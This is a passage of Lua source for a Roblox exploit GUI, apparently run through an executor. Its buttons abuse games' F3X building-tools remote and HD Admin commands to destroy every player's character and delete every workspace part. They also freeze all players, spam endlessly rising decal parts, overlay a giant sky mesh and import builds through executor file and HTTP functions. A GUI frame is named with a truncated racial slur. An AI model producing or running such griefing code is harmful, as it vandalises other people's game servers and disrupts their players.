		local function SetTransparency(p, value)
			local args = {
				[1] = "SyncTransparency",
				[2] = {
					[1] = {
						["Part"] = p,
						["Transparency"] = value
					}
				}
			}
			_(args)
		end
	
		local function SyncRotate(cf)
			if not part or not part.Parent then return end
			local args = {
				[1] = "SyncRotate",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
	
		local function Sky()
			local hrp = character:FindFirstChild("HumanoidRootPart")
			if not hrp then return end
			local startCF = hrp.CFrame + Vector3.new(0,6,0)
			CreatePart(startCF, workspace)
			for _, obj in workspace:GetDescendants() do
				if obj:IsA("BasePart") and (obj.Position - startCF.Position).Magnitude < 0.1 then
					part = obj
					baseCF = part.CFrame
					SetAnchor(part,true)
					AddMesh(part)
					SetMesh(part,"111891702759441")
					SetTexture(part,"rbxassetid://100402936909391")
					ResizeMesh(part, Vector3.new(6000,6000,6000))
					SetTransparency(part,0)
					-- i think you taking this so give credit
					local rotation = math.rad(100)
					connection = RunService.Heartbeat:Connect(function(dt)
						if not part or not part.Parent then
							if connection then
								connection:Disconnect()
								connection = nil
							end
							return
						end
						angle += rotation * dt
						local cf = baseCF * CFrame.Angles(5, angle, 1)
						SyncRotate(cf)
						part.CFrame = cf
					end)
					break
				end
			end
		end
	
		Sky()
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_2b);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_2d()
local script = G2L["2d"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
		while wait(0.1) do
			spawn(function()
				e = char.HumanoidRootPart.CFrame.x + math.random(-100, 100)
				f = char.HumanoidRootPart.CFrame.y
				g = char.HumanoidRootPart.CFrame.z + math.random(-100, 100)
				CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
				for i,v in game.Workspace:GetDescendants() do
					if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
	
						SetName(v,"piroca")
						SpawnDecal(v,Enum.NormalId.Front)
						AddDecal(v,"4554325647",Enum.NormalId.Front)
						SpawnDecal(v,Enum.NormalId.Back)
						AddDecal(v,"105060169566389",Enum.NormalId.Back)
						SetTrans(v,1)
						Resize(v,Vector3.new(7,7,0.1),v.CFrame)
						SetLocked(v,true)
						while wait(0.01) do
							MovePart(v,CFrame.new(v.CFrame.x,v.CFrame.y + 1,v.CFrame.z))
						end
					end
				end
			end)
		end
	
	
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_2d);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_2f()
local script = G2L["2f"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		-- === iORB (Fixed & Clean) ===
		-- Made by LnickyTheDestroyer (Blue2spookified version)
		-- Paste this into a LocalScript
	
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local hrp = char:WaitForChild("HumanoidRootPart")
	
		-- Find F3X Tool
		local tool
		for _, v in ipairs(player:GetDescendants()) do
			if v.Name == "SyncAPI" then tool = v.Parent break end
		end
		if not tool then
			for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
				if v.Name == "SyncAPI" then tool = v.Parent break end
			end
		end
	
		if not tool then
			warn("❌ F3X / Building Tools not found! Do ;btools first")
			return
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local rq = game.ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		local function _(args) remote:InvokeServer(unpack(args)) end
	
		local function CreatePart(cf, parent, shape)
			return remote:InvokeServer("CreatePart", shape or "Normal", cf, parent)
		end
	
		local function Resize(part, size, cf)
			_({"SyncResize", {{Part = part, CFrame = cf, Size = size}}})
		end
	
		local function MovePart(part, cf)
			_({"SyncMove", {{Part = part, CFrame = cf}}})
		end
	
		local function Color(part, color)
			_({"SyncColor", {{Part = part, Color = color, UnionColoring = false}}})
		end
	
		local function SetAnchor(part, bool)
			_({"SyncAnchor", {{Part = part, Anchored = bool}}})
		end
	
		local function SetCollision(part, bool)
			_({"SyncCollision", {{Part = part, CanCollide = bool}}})
		end
	
		local function SetLocked(part, bool)
			_({"SetLocked", {part}, bool})
		end
	
		local function SetTrans(part, num)
			_({"SyncMaterial", {{Part = part, Transparency = num}}})
		end
	
		local function mat(part, material)
			_({"SyncMaterial", {{Part = part, Material = material}}})
		end
	
		local function AddMesh(part)
			_({"CreateMeshes", {{Part = part}}})
		end
	
		local function SetMeshType(part, meshType)
			_({"SyncMesh", {{Part = part, MeshType = meshType}}})
		end
	
		local function MeshResize(part, scale)
			_({"SyncMesh", {{Part = part, Scale = scale}}})
		end
	
		local function DestroyPart(part)
			_({"Remove", {part}})
		end
	
		local function Clone(part, parent)
			return remote:InvokeServer("Clone", {part}, parent)
		end
	
		local function SetName(part, name)
			_({"SetName", {part}, name})
		end
	
		-- ================== ACTUAL iORB ==================
		rq:InvokeServer(";titlebk me " .. player.DisplayName .. "'s i0rb")
	
		local cf = hrp.CFrame * CFrame.new(6, 2, 0)
		local pad = CreatePart(cf, workspace, "Ball")
		Clone(char.Head, pad)
	
		rq:InvokeServer(";untitle")
	
		-- Setup the orb
		Resize(pad, Vector3.new(1,1,1), cf)
		SetAnchor(pad, true)
		mat(pad, Enum.Material.Neon)
		SetCollision(pad, false)
		SetLocked(pad, true)
		SetName(pad, "Orbit-(Blue2spookified-Version)")
	
		AddMesh(pad)
		SetMeshType(pad, Enum.MeshType.Sphere)
		MeshResize(pad, Vector3.new(1,1,1))
		Color(pad, Color3.fromRGB(0,0,0))
	
		-- Hide the cloned head
		local nameHead = pad:FindFirstChild("Head")
		if nameHead then
			SetAnchor(nameHead, true)
			SetTrans(nameHead, 1)
			if nameHead:FindFirstChild("face") then DestroyPart(nameHead.face) end
			SetCollision(nameHead, false)
		end
	
		-- Orbit movement
		local radius = 5
		local speed = 2
		local t = 0
	
		game:GetService("RunService").RenderStepped:Connect(function(delta)
			if not (pad and hrp) then return end
			t = t + delta * speed
			local x = math.cos(t) * radius
			local y = math.sin(t * 1.5) * radius * 0.5
			local z = math.sin(t) * radius
			local newCF = CFrame.new(hrp.Position + Vector3.new(x, y, z))
			MovePart(pad, newCF)
			if nameHead then MovePart(nameHead, newCF) end
		end)
	
		-- Inner particles
		while task.wait(0.0005) do
			if char:FindFirstChild("Humanoid") and char.Humanoid.Health <= 0 then break end
	
			local p2 = CreatePart(CFrame.new(), pad, "Normal")
			Resize(p2, Vector3.new(0.3,0.3,0.3), pad.CFrame)
			SetAnchor(p2, true)
			SetCollision(p2, false)
			Color(p2, Color3.fromRGB(0,0,0))
			SetTrans(p2, 0.3)
			mat(p2, Enum.Material.Neon)
	
			task.wait(0.5)
			DestroyPart(p2)
		end
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_2f);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_31()
local script = G2L["31"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
	
		local Players = game:GetService("Players")
		local workspace = game:GetService("Workspace")
		local player = Players.LocalPlayer
	
		local function findTool()
			local char = player.Character or player.CharacterAdded:Wait()
	
			for _, v in ipairs(char:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
	
			for _, v in ipairs(player.Backpack:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
		end
	
		local tool = findTool()
		if not tool then return end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local function call(a)
			return remote:InvokeServer(unpack(a))
		end
	
		-- i dont used the b2s sky function anymore, i used this instead
		local hack = workspace:FindFirstChild("E")
		if hack then
			call({ "Remove", { hack } })
		end
	
		local char = player.Character or player.CharacterAdded:Wait()
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
	
		local sky = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
	
		task.spawn(function()
			call({ "SyncAnchor", { { Part = sky, Anchored = true } } })
		end)
	
		task.spawn(function()
			call({ "SyncCollision", { { Part = sky, CanCollide = false } } })
		end)
	
		task.spawn(function()
			call({ "CreateMeshes", { { Part = sky } } })
		end)
	
		task.spawn(function()
			call({
				"SyncMesh",
				{{
					Part = sky,
					MeshId = "rbxassetid://111891702759441",
					TextureId = "rbxassetid://131981357660636",
					Scale = Vector3.new(100999, 100999, 100999),
					VertexColor = Vector3.new(3.6, 3.6, 3.6)
				}}
			})
		end)
	
		task.spawn(function()
			call({ "SetLocked", { sky }, true })
		end)
	
		task.spawn(function()
			call({ "SetName", { sky }, "cZerSky" })
		end)
	
		task.spawn(function()
			call({ "SyncMaterial", { { Part = sky, Transparency = 0 } } })
		end)
	
		task.spawn(function()
			call({ "SyncMove", { { Part = sky, CFrame = cf } } }) -- fe bypass rel
		end)
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_31);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_33()
local script = G2L["33"];
	script.Parent.MouseButton1Click:Connect(function()
		
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function Punish(player)
			char = player.Character
			DestroyPart(char)
		end
	
		for i,v in game.Players:GetPlayers() do
			--zzspawn(function()
			pcall(function()
				Punish(v)
			end)
			--end)
		end
		wait(0.5)
		local function unanchor(part)
			local buildingTools = nil
			local player = game:GetService("Players").LocalPlayer
	
			for _, item in pairs(player.Character:GetChildren()) do
				if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
					buildingTools = item
					break
				end
			end
	
			if not buildingTools then
				for _, item in pairs(player.Backpack:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						buildingTools = item
						break
					end
				end
			end
	
			if buildingTools then
				local syncAPI = buildingTools:FindFirstChild("SyncAPI")
				if syncAPI then
					local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
					if serverEndpoint then
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						serverEndpoint:InvokeServer(unpack(args))
					end
				end
			end
		end
	
		local function unanchorAllParts(workspaceObject)
			for _, obj in pairs(workspaceObject:GetDescendants()) do
				if obj:IsA("Part") or obj:IsA("MeshPart") then
					unanchor(obj)
				end
			end
		end
	
		unanchorAllParts(workspace)
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";re all")
		RequestCommandSilent:InvokeServer(";freeze all")
		RequestCommandSilent:InvokeServer(";btools me")
	
	
	
	
		--                                                           ^ put a command like ;fly
		--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		local CollectionService = game:GetService('CollectionService')
		local httpservice = game:GetService("HttpService")
		local Player = game:GetService("Players").LocalPlayer
	
		-------- SETTINGS ----------
		local F3X_ImportCode = "yiqg" --Leave blank for UI
		local Parent = workspace
		local RealativeCFrame = nil
	
		local Group = false -- Slow :v
		local ForcedAnchor = true
		------ END SETTINGS --------
	
		local Log = print
	
		local function print(...)
			if Log and type(Log) == 'function' then
				Log(...)		
			end
		end
	
		local cccc = coroutine.running()
		function STOP()
			task.defer(task.cancel, cccc)
		end
	
		local function assert(cond, ...)
			if not cond then
				if Log and type(Log) == 'function' then
					Log(...)		
				end
				STOP()
				task.defer(task.cancel, coroutine.running())
				wait()
			end
		end
	
		local Types = {
			Part = 0,
			WedgePart = 1,
			CornerWedgePart = 2,
			VehicleSeat = 3,
			Seat = 4,
			TrussPart = 5,
			SpecialMesh = 6,
			Texture = 0,
			Decal = 8,
			PointLight = 9,
			SpotLight = 10,
			SurfaceLight = 11,
			Smoke = 12,
			Fire = 13,
			Sparkles = 14,
			Model = 15,
			Folder = 18
		};
	
		local PartTypes = {
			[Enum.PartType.Block.Value] = "Normal",
			[Enum.PartType.Ball.Value] = "Ball",
			[Enum.PartType.Wedge.Value] = "Wedge",
			[Enum.PartType.Cylinder.Value] = "Cylinder",
			[Enum.PartType.CornerWedge.Value] = "Corner",
			FromTypes = {
				[Types.WedgePart] = "Wedge",
				[Types.CornerWedgePart] = "Corner",
				[Types.VehicleSeat] = "Vehicle Seat",
				[Types.Seat] = "Seat",
				[Types.TrussPart] = "Truss",
			}
		}
	
		local Events = {}
		local MaxThreads = 1000
		local ThreadWatch = {Threads = {}}
	
		function ThreadWatch:Add(Thread:thread)
			if typeof(Thread) == 'thread' then
				table.insert(ThreadWatch.Threads,Thread)
			end
		end
	
		local GabrageDebounce = false
		function ThreadWatch:GarbageCollect()
	
			if GabrageDebounce then
				return
			end
	
			GabrageDebounce = true
	
			local NList = {}
	
			for Index,Thread in ipairs(ThreadWatch.Threads) do
				if typeof(Thread) == 'thread' and coroutine.status(Thread) ~= "dead" then
					table.insert(NList,Thread)
				end
			end
	
			ThreadWatch.Threads = NList
	
			GabrageDebounce = false
		end
	
		function tcall(func,...)
			if #ThreadWatch.Threads > MaxThreads then
				repeat task.wait(); ThreadWatch:GarbageCollect() until #ThreadWatch.Threads < MaxThreads
			end
			ThreadWatch:Add(task.spawn(func,...))
		end
	
	
	
		local Support = {
			Slice = function (Table, Start, End)
				-- Returns values from `Start` to `End` in `Table`
	
				local Slice = {};
	
				-- Go through the given indices
				for Index = Start, End do
					table.insert(Slice, Table[Index]);
				end;
	
				-- Return the slice
				return Slice;
	
			end;
		}
	
		function filterProperties(tbl, ...)
			local newtbl = {}
			for i,iv in pairs(tbl) do
				for _,v in ipairs({...}) do
					if iv[v] then
						if not newtbl[i] then
							newtbl[i] = {}
						end
						newtbl[i][v] = tbl[i][v]
					end
				end
			end
			return newtbl
		end
	
		if not F3X_ImportCode or F3X_ImportCode == "" then
			local BTImportUI = Instance.new("ScreenGui")
			local Boarder = Instance.new("Frame",BTImportUI)
			local UICorner = Instance.new("UICorner",Boarder)
			local AspectRatio = Instance.new("UIAspectRatioConstraint",Boarder)
	
			local TextBox = Instance.new("TextBox",Boarder)
			local ButtonBGDecor = Instance.new("Frame",Boarder)
			local ImportButton = Instance.new("TextButton",ButtonBGDecor)
	
			local ToggleAnchor = Instance.new("ImageButton",ButtonBGDecor)
			local ToggleGroups = Instance.new("ImageButton",ButtonBGDecor)
	
			local txt = Instance.new("TextLabel",Boarder)
	
			local function t(I)
				if I.Rotation == 0 then
					I.Rotation = 21
					I.BackgroundColor3 = Color3.new(0.2, 1, 0.3)
				else
					I:ResetPropertyToDefault("BackgroundColor3")
					I:ResetPropertyToDefault("Rotation")
				end
			end
	
			BTImportUI.Parent = game.Players.LocalPlayer.PlayerGui
	
			Boarder.AnchorPoint = Vector2.one/2
			Boarder.Position = UDim2.fromScale(.5,.5)
	
			Boarder:TweenSize(UDim2.fromOffset(300,300))
	
			Boarder.BackgroundColor3 = Color3.new()
			Boarder.Transparency = 0.3
	
			UICorner.CornerRadius = UDim.new(.15,0)
	
			AspectRatio.AspectRatio = 2
	
			TextBox.Size = UDim2.fromScale(0.8,0.3)
			TextBox.Position = UDim2.fromScale(0.1,0.1)
			TextBox.TextScaled = true
			TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
			TextBox.Text = ""
			TextBox.PlaceholderText = "Whats your Creation ID?\nLeave blank to cancel"
			UICorner:Clone().Parent = TextBox
	
			ButtonBGDecor.Size = UDim2.fromScale(0.5,0.3)
			ButtonBGDecor.Position = UDim2.fromScale(0.25,0.55)
			ButtonBGDecor.BackgroundColor3 = Color3.new(1, .5)
	
			ImportButton.Size = UDim2.fromScale(1,0.9)
			ImportButton.BackgroundColor3 = Color3.new(1, 1)
			ImportButton.TextScaled = true
			ImportButton.Text = "Import"
	
			ToggleAnchor.Image = "rbxasset://textures/TagEditor/famfamfam.png"
			ToggleAnchor.ImageRectSize = Vector2.one*16
			ToggleAnchor.ImageRectOffset = Vector2.yAxis*16
			ToggleAnchor.Size = UDim2.fromOffset(16,16)
			ToggleAnchor.Position = UDim2.fromScale(1.05,0)
			ToggleAnchor.MouseButton1Click:Connect(function() t(ToggleAnchor) end)
			if ForcedAnchor then t(ToggleAnchor) end
	
			ToggleGroups.Image = "rbxasset://textures/ClassImages.png"
			ToggleGroups.ImageRectSize = Vector2.one*16
			ToggleGroups.ImageRectOffset = Vector2.xAxis*2*16
			ToggleGroups.Size = ToggleAnchor.Size
			ToggleGroups.Position = ToggleAnchor.Position + UDim2.fromOffset(0,16)
			ToggleGroups.MouseButton1Click:Connect(function() t(ToggleGroups) end)
			if Group then t(ToggleGroups) end
	
			txt.Text = "This wont work on all F3X Building Tools."
			txt.TextXAlignment = Enum.TextXAlignment.Left
			txt.TextYAlignment = Enum.TextYAlignment.Bottom
			txt.TextColor3 = Color3.new(1,1,1)
			txt.TextStrokeTransparency = 0.5
	
			local function CloseUI()
				Boarder:TweenSizeAndPosition(UDim2.fromScale(0,0),UDim2.fromScale(.5,.5),nil,nil,0.5)
				wait(1)
				BTImportUI:Destroy()
			end
	
			repeat
				ImportButton.MouseButton1Click:Wait()
				F3X_ImportCode = TextBox.Text
	
				if F3X_ImportCode == "" then
					TextBox.Text = "Are you sure you want to cancel?"
				end
			until F3X_ImportCode ~= ""
	
			if F3X_ImportCode == "Are you sure you want to cancel?" then
				CloseUI()
				return
			end
	
			ImportButton.Text = "Close GUI"
			ImportButton.MouseButton1Click:Once(CloseUI)
	
			TextBox.ClearTextOnFocus = false
			TextBox.TextEditable = false
			ToggleAnchor.Visible = false
			ToggleGroups.Visible = false
	
			Log = function(...)
				TextBox.Text = ""
				for _,v in ipairs{...} do
					TextBox.Text = TextBox.Text.. tostring(v)
				end
			end
	
			Group = ToggleGroups == 21
			ForcedAnchor = ToggleAnchor == 21
		end
	
	
	
		print("FETCHING F3X SERVER...")
		local build
		if isfile("f3x/"..F3X_ImportCode) then
			build = readfile("f3x/"..F3X_ImportCode)
		else
			build = game:HttpGet('http://www.f3xteam.com/bt/export/'..F3X_ImportCode)
			writefile("f3x/"..F3X_ImportCode, build)
		end
	
		local success, Data = pcall(httpservice.JSONDecode,httpservice,build)
		assert(success, "ERROR: FAILED TO DECODE JSON STRING\nDid You write the correct code?")
		assert(Data.Version == 3, "ERROR: ONLY SUPPORTED SerializationV3.")
		build = nil
	
	
		function GetSyncAPI()
			return  if Player.Character 
				and Player.Character:FindFirstChildOfClass("Tool") 
				and Player.Character:FindFirstChildOfClass("Tool"):FindFirstChildOfClass("BindableFunction")
				then Player.Character:FindFirstChildOfClass("Tool"):FindFirstChildOfClass("BindableFunction")
				else Player.Backpack:FindFirstChild("SyncAPI",true)
		end
	
		local SyncAPI
	
		print("Grabbing SyncAPI...")
		repeat SyncAPI = GetSyncAPI(); wait() until SyncAPI 
	
		if not SyncAPI.Parent.Loaded.value then
			SyncAPI.Parent.Loaded.Changed:wait()
		end
	
		local function f(...)
			return { SyncAPI:Invoke(...) }
		end
	
		function Invoke(...)
			local s, r = pcall(f,...)
	
			if not s then
				warn(r)
			end
			assert(s,"ERROR: The server returned an error.")
	
			return table.unpack(r)
		end
	
		local MappingInstances = {}
	
		local Parts = {}
	
		Parent.ChildAdded:Connect(function(Part)
			if Part:IsA("BasePart") and not Part:IsA("MeshPart") then
				table.insert(Parts,Part)
			end 
		end)
	
		function GetSparePart(PartType)
			for i,Part in ipairs(Parts) do
				if not table.find(MappingInstances,Part) then
					if (Part:IsA("Seat") and PartTypes.FromTypes[Types.Seat]) == PartType
						or (Part:IsA("VehicleSeat") and PartTypes.FromTypes[Types.VehicleSeat]) == PartType
						or (Part:IsA("TrussPart") and PartTypes.FromTypes[Types.TrussPart]) == PartType
						or PartTypes[Part.Shape.Value] == PartType then
						return Part
					end
				end
			end
		end
	
		function CreatePart(PartType, CF, Parent)
			CF = CF or RealativeCFrame
	
			local Part, replicationTag = Invoke('CreatePart', PartType, CF, Parent)	
	
			if (Part == nil) and replicationTag then
				local existingMarker = CollectionService:GetTagged(replicationTag)[1]
				if existingMarker then
					Part = existingMarker.Parent
				else
					Part = CollectionService:GetInstanceAddedSignal(replicationTag):Wait().Parent
					if not Part then
						repeat wait((tick()%0.000001) / 0.000001); Part = GetSparePart(PartType) until Part
	
					end
				end
			end
	
			return Part
		end
	
		function IsAPart(Id)
			local Datum = Data.Items[Id]
			if Datum
				and (Datum[1] == Types.Part
					or Datum[1] == Types.WedgePart
					or Datum[1] == Types.CornerWedgePart
					or Datum[1] == Types.VehicleSeat
					or Datum[1] == Types.Seat
					or Datum[1] == Types.TrussPart)
			then
				return true
			else
				return false
			end
		end
	
		print("Checking Configuration")
	
		if not Parent then
			Parent = workspace
		end
	
		if not RealativeCFrame then
			RealativeCFrame = 
				(Parent:FindFirstChild(F3X_ImportCode) and Parent[F3X_ImportCode]:IsA("BasePart") and Parent[F3X_ImportCode].CFrame)
				or CFrame.new() + (Player.Character or Player.CharacterAdded:Wait()).PrimaryPart.Position
		end
	
		Parts[1] = CreatePart("Normal",RealativeCFrame,Parent)
	
		print("Generating Parts...")
	
		local PartCount = 0
		local FinPart = 0
	
		for Index,Datum in ipairs(Data.Items) do
			if IsAPart(Index) then
				PartCount += 1
				local PartType = PartTypes.FromTypes[Datum[1]] or PartTypes[Datum[33]]
				tcall(function()
					local Item =  CreatePart(PartType,RealativeCFrame,Parent)
	
					MappingInstances[Index] = Item
					FinPart += 1
				end)
			end
		end
	
		repeat wait(); ThreadWatch:GarbageCollect() until #ThreadWatch.Threads <= 0
	
		--Update Part Properties
	
		function ChangeSet(Table,Value)
			if not Table.ns then
				Table.ns = {}
			end
	
			local Offset = Table.ns[Value.Part] or 0
			Offset += 1
	
			if not Table[Offset] then
				Table[Offset] = {}
			end
	
			Table.ns[Value.Part] = Offset
	
			table.insert(Table[Offset],Value)
		end
	
		function ApplyChange(Call,Table,Filter)
			if Filter then
				for _,v in ipairs(Table) do
					Invoke(Call,filterProperties(v,table.unpack(Filter)))
				end
			else
				for _,v in ipairs(Table) do
					Invoke(Call,v)
				end
			end
		end
	
		print("Grouping...")
	
		local Childrens = {}
	
		-- "buffer"?
		for Index,Datum in ipairs(Data.Items) do
			if IsAPart(Index)
				or Datum[1] == Types.Model
				or Datum[1] == Types.Folder
			then
	
				if not Childrens[Datum[2]] then
					Childrens[Datum[2]] = {Index}
				else
